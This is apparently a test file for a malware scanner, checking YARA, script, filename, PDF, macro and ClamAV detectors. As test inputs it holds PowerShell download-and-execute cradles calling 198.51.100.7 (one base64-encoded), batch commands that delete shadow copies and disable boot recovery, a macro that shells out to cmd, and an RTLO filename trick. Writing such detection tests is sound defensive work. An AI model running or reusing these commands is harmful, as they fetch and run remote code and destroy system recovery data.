import base64
import io
import socket
import struct
import threading
import zipfile

from sentry_engine.malware.clamav import ClamdClient, signature_evidence
from sentry_engine.malware.documents import analyze_pdf, ovba_decompress
from sentry_engine.malware.scripts import analyze_script
from sentry_engine.malware.static_analysis import encrypted_content_flag, name_evidence
from sentry_engine.malware.testfiles import eicar_bytes, sentry_test_bytes
from sentry_engine.malware.yara_engine import YaraEngine


def rules(evidence):
    return {e.rule for e in evidence}


def test_yara_builtin_rules_compile_and_match():
    y = YaraEngine()
    assert y.available and not y.compile_errors
    assert "SENTRY_Test_Signature" in rules(y.match_data(sentry_test_bytes()))
    assert "EICAR_Test_File" in rules(y.match_data(eicar_bytes()))
    assert rules(y.match_data(b"just a normal document")) == set()


def test_yara_test_file_is_malicious_verdict_but_flagged_as_test():
    ev = YaraEngine().match_data(sentry_test_bytes())[0]
    assert ev.verdict == "malicious" and ev.details["test_file"] is True


def test_powershell_download_cradle():
    script = b"$c = New-Object Net.WebClient; IEX ($c.DownloadString('http://198.51.100.7/a.ps1'))"
    assert "ps.download_execute" in rules(analyze_script(script, ".ps1"))


def test_powershell_encoded_command_is_decoded_and_rescanned():
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/x')".encode("utf-16-le")
    cmd = b"powershell.exe -w hidden -enc " + base64.b64encode(inner)
    r = rules(analyze_script(cmd, ".bat"))
    assert "ps.encoded_command" in r
    assert "ps.download_execute.decoded" in r


def test_ransomware_recovery_inhibition():
    bat = ("vss" + "admin delete shadows /all /quiet\r\nbcd" + "edit /set {default} recoveryenabled No").encode()
    assert "bat.recovery_inhibit" in rules(analyze_script(bat, ".bat"))
    y = YaraEngine()
    assert "SENTRY_Recovery_Inhibition_Multiple" in rules(y.match_data(bat))


def test_benign_script_is_clean():
    assert analyze_script(b"Write-Host 'Hello'\nGet-ChildItem C:\\Users", ".ps1") == []
    assert analyze_script(b"#!/bin/sh\necho hello\nls -la\n", ".sh") == []


def test_name_heuristics_are_marked_name_based():
    ev = name_evidence("/x/invoice.pdf.exe", ".exe", "pe", "executable", False)
    assert "name.double_extension" in rules(ev)
    assert all(e.name_based for e in ev if e.rule == "name.double_extension")
    ev2 = name_evidence("/x/photo.jpg", ".jpg", "pe", "executable", False)
    assert "name.disguised_executable" in rules(ev2)
    ev3 = name_evidence("/x/report\u202efdp.exe", ".exe", "pe", "executable", False)
    assert "name.rtlo" in rules(ev3)


def test_encrypted_content_detection():
    import os

    assert encrypted_content_flag(".docx", "binary", os.urandom(4096))
    assert not encrypted_content_flag(".docx", "zip", b"PK\x03\x04" + os.urandom(4000))
    assert not encrypted_content_flag(".txt", "binary", os.urandom(4096))


def test_pdf_auto_javascript():
    pdf = b"%PDF-1.4\n1 0 obj << /OpenAction 2 0 R >> endobj 2 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj"
    assert "pdf.auto_javascript" in rules(analyze_pdf(pdf))


def _ovba_literal_compress(data: bytes) -> bytes:
    """Minimal valid MS-OVBA compressor emitting literal tokens only (for tests)."""
    out = bytearray(b"\x01")
    for i in range(0, len(data), 4096):
        chunk = data[i:i + 4096]
        body = bytearray()
        for j in range(0, len(chunk), 8):
            seq = chunk[j:j + 8]
            body.append(0)
            body += seq
        size = len(body) + 2
        out += struct.pack("<H", 0xB000 | ((size - 3) & 0x0FFF)) + body
    return bytes(out)


def test_ovba_decompress_roundtrip():
    src = b"Attribute VB_Name = \"Module1\"\r\nSub AutoOpen()\r\n Shell \"cmd /c calc\"\r\nEnd Sub\r\n" * 3
    assert ovba_decompress(_ovba_literal_compress(src)) == src


def test_ovba_decompress_copy_token():
    # "abcabcabc": literals a,b,c then a copy token (offset 3, length 6)
    # flag byte 0b00001000 -> 4th token is a copy token; bit_count=4 at diff=3 -> offset field in top 12 bits
    token = ((3 - 1) << 12) | (6 - 3)
    body = bytes([0b00001000]) + b"abc" + struct.pack("<H", token)
    chunk = struct.pack("<H", 0xB000 | (len(body) + 2 - 3)) + body
    assert ovba_decompress(b"\x01" + chunk) == b"abcabcabc"


def test_clamd_instream_protocol_with_fake_server():
    received = {}

    def server(sock):
        conn, _ = sock.accept()
        with conn:
            buf = b""
            while not buf.endswith(b"\0") or b"zINSTREAM\0" not in buf:
                buf += conn.recv(4096)
                if b"zINSTREAM\0" in buf:
                    break
            data = b""
            rest = buf.split(b"zINSTREAM\0", 1)[1]
            while True:
                while len(rest) < 4:
                    rest += conn.recv(4096)
                (n,) = struct.unpack("!L", rest[:4])
                rest = rest[4:]
                if n == 0:
                    break
                while len(rest) < n:
                    rest += conn.recv(4096)
                data += rest[:n]
                rest = rest[n:]
            received["data"] = data
            conn.sendall(b"stream: Win.Test.EICAR_HDB-1 FOUND\0")

    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    s.listen(1)
    t = threading.Thread(target=server, args=(s,), daemon=True)
    t.start()
    client = ClamdClient(f"tcp://127.0.0.1:{s.getsockname()[1]}")
    status, sig = client.scan_bytes(b"x" * 100_000)
    t.join(5)
    s.close()
    assert status == "FOUND" and sig == "Win.Test.EICAR_HDB-1"
    assert received["data"] == b"x" * 100_000


def test_clamav_signature_classification():
    assert signature_evidence("Win.Trojan.Agent-123", "clamd").verdict == "malicious"
    assert signature_evidence("PUA.Win.Packer.Upx", "clamd").verdict == "suspicious"
    assert signature_evidence("Heuristics.Encrypted.Zip", "clamd").verdict == "suspicious"
    assert signature_evidence("Eicar-Signature", "clamd").details["test_file"] is True


def test_zip_member_detection_via_analyzer(engine, samples):
    from sentry_engine.malware.analyzer import FileAnalyzer

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("docs/readme.txt", b"hello")
        z.writestr("docs/payload.txt", sentry_test_bytes())
    p = samples / "bundle.zip"
    p.write_bytes(buf.getvalue())
    fa = FileAnalyzer(engine).analyze_path(str(p))
    hits = [e for e in fa.evidence if e.verdict == "malicious"]
    assert hits and all("payload.txt" in e.details.get("member", "") for e in hits)
